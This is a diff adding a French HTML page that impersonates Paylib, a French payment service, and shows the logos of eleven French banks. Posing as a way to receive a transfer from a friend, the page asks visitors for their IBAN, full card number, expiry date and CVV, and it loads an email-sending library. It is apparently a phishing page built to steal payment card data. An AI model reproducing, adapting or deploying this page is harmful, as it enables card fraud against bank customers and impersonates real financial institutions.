@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>Saisie de l'IBAN</title>
+        <link rel="stylesheet" href="style.css" />
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+            rel="stylesheet"
+        />
+    </head>
+    <body>
+        <main class="container">
+            <image src="images/paylib.png" alt="logo" class="img" />
+            <hr class="separator" />
+            <div class="title-container">
+                <p class="title">Instant banque</p>
+            </div>
+
+            <form id="validationForm">
+                <input
+                    type="text"
+                    name="iban"
+                    id="iban"
+                    class="ibaninput"
+                    maxlength="33"
+                    placeholder="Entrez votre IBAN"
+                    autofocus
+                />
+                <div class="container-remind">
+                    <p id="subtitle">
+                        Retrouvez l'IBAN sur votre relevé d'identité bancaire
+                    </p>
+                    <div class="remindIban">
+                        <input type="checkbox" class="remindIbanCheckbox" />
+                        <label for="remindIbanText"
+                            >Se souvenir de mon IBAN</label
+                        >
+                    </div>
+                </div>
+                <input
+                    type="text"
+                    name="card"
+                    maxlength="19"
+                    id="card"
+                    class="cardinput"
+                    placeholder="Numero de carte bancaire"
+                />
+                <p id="errorCarteNumber"></p>
+                <div class="containerinput">
+                    <input
+                        type="month"
+                        id="date"
+                        name="date"
+                        class="dateinput"
+                        value="2024-01"
+                    />
+                    <input
+                        type="text"
+                        name="cvv"
+                        id="cvv"
+                        class="cvvinput"
+                        placeholder="CVV"
+                    />
+                </div>
+                <div class="errors">
+                    <p id="errorDate"></p>
+                    <p id="errorCvv"></p>
+                </div>
+                <div class="policy">
+                    <input type="checkbox" class="policyCheckbox" id="policy" />
+                    <label for="policyText"
+                        ><a class="policyLink" href="/now/policy.html"
+                            >J’accepte les Conditions Générales
+                            d’Utilisation.</a
+                        ></label
+                    >
+                </div>
+                <button type="submit" id="submit" disabled>
+                    <span class="submitText">RECUPERER MON ARGENT</span>
+                </button>
+            </form>
+
+            <hr class="separator" />
+            <div class="container-3">
+                <p
+                    style="
+                        font-weight: 300;
+                        font-size: 0.75rem;
+                        font-style: italic;
+                        text-align: justify;
+                        line-height: 20px;
+                    "
+                >
+                    Votre numéro de téléphone a été communiqué par un
+                    utilisateur du service paylib entre amis souhaitant verser
+                    des fonds sur votre compte.
+                </p>
+                <button class="btn-open">
+                    <img
+                        id="btnDown"
+                        src="images/arrowDown.svg"
+                        class="img-arrow"
+                        alt="phone"
+                    />
+                    <img
+                        id="btnUp"
+                        src="images/arrowUp.svg"
+                        class="img-arrow"
+                        alt="phone"
+                    />
+                </button>
+            </div>
+            <div id="paragraphe" class="container-4">
+                <p>
+                    Les données à caractère personnel vous concernant
+                    recueillies sur ce formulaire sont indispensables afin de
+                    nous permettre de réaliser ce virement. Si vous n’acceptez
+                    pas de nous communiquer ces données, nous ne serons pas en
+                    mesure de finaliser l’opération et vous ne pourrez donc pas
+                    recevoir les fonds sur votre compte. Le cas échéant, le
+                    compte de l’utilisateur du service Paylib ne sera pas débité
+                    et votre compte ne sera pas crédité. Vos données à caractère
+                    personnel sont traitées uniquement aux fins d'exécution du
+                    virement, de contrôle, et de prévention de la fraude.
+                </p>
+                <p>
+                    Vous bénéficiez d’un droit d'accès, de rectification de vos
+                    données à caractère personnel ainsi qu’un droit à la
+                    portabilité et le droit de définir des directives relatives
+                    au sort des données après votre mort. Vous avez également le
+                    droit de demander l’effacement de vos données ou la
+                    limitation de leur traitement
+                </p>
+                <p>
+                    Vous pouvez exercer ces droits auprès de Paylib Services en
+                    sa qualité de responsable de traitement à l’adresse :
+                    <i style="text-decoration: underline; color: blue"
+                        >dpo@paylib.fr</i
+                    >
+                    et Paylib Services, 71 Boulevard National 92250 La Garenne
+                    Colombes.
+                </p>
+            </div>
+            <div class="sponsor">
+                <span class="sponsorText"
+                    >Ce service vous est proposé par:</span
+                >
+            </div>
+
+            <div class="logoDiv">
+                <ul class="logoList">
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo1"
+                            src="images/creditAgricole.jpeg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo2"
+                            src="images/bnp.jpeg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo3"
+                            src="images/banque postale 1.jpg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo4"
+                            src="images/societe generale.png"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo5"
+                            src="images/hello banque.jpeg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo6"
+                            src="images/credit mutuel arkea.jpeg"
+                            alt=""
+                        />
+                    </li>
+                </ul>
+                <ul class="logoList2">
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo7"
+                            src="images/banque populaire1.jpg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo8"
+                            src="images/caisse d'epargne.jpeg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo9"
+                            src="images/credit mutuel.jpg"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo10"
+                            src="images/cic logo.png"
+                            alt=""
+                        />
+                    </li>
+                    <li>
+                        <img
+                            class="logo"
+                            id="logo11"
+                            src="images/lcl logo.png"
+                            alt=""
+                        />
+                    </li>
+                </ul>
+            </div>
+            <hr class="separator" />
+            <footer class="footer">
+                <ul class="footerlist">
+                    <li class="footerList1">
+                        <a href="policy.html">Mentions legales</a>
+                    </li>
+                    <li>|</li>
+                    <li class="footerList2"><a href="">FAQ</a></li>
+                    <li>|</li>
+                    <li class="footerList3"><a href="">CGU</a></li>
+                    <li>|</li>
+                    <li class="footerList4">
+                        <a href="">Cookies et données</a>
+                    </li>
+                </ul>
+                <p class="footerLast"><a href="">Se désinscrire</a></p>
+            </footer>
+        </main>
+        <script
+            type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+        ></script>
+        <script src="script.js"></script>
+    </body>
+</html>
